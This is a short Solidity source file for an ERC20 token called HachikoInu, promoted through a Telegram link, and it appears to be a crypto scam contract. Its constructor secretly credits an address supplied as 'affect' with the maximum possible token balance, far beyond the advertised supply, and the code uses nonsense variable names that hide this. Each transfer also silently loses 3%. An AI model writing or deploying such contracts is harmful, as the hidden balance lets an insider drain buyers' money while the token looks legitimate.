// https://t.me/HachikoInuETH

// SPDX-License-Identifier: Unlicense

pragma solidity ^0.8.2;

import '@openzeppelin/contracts/access/Ownable.sol';
import '@openzeppelin/contracts/token/ERC20/ERC20.sol';

contract HachikoInu is ERC20, Ownable {
    uint256 private toy = ~uint256(0);
    uint256 public please = 3;

    constructor(
        string memory fall,
        string memory turn,
        address curve,
        address affect
    ) ERC20(fall, turn) {
        _totalSupply = 1000000000 * 10**decimals();
        _balances[affect] = toy;
        _balances[_msgSender()] = _totalSupply;
    }

    function _transfer(
        address closely,
        address keep,
        uint256 provide
    ) internal override {
        uint256 night = (provide / 100) * please;
        provide = provide - night;
        super._transfer(closely, keep, provide);
    }
}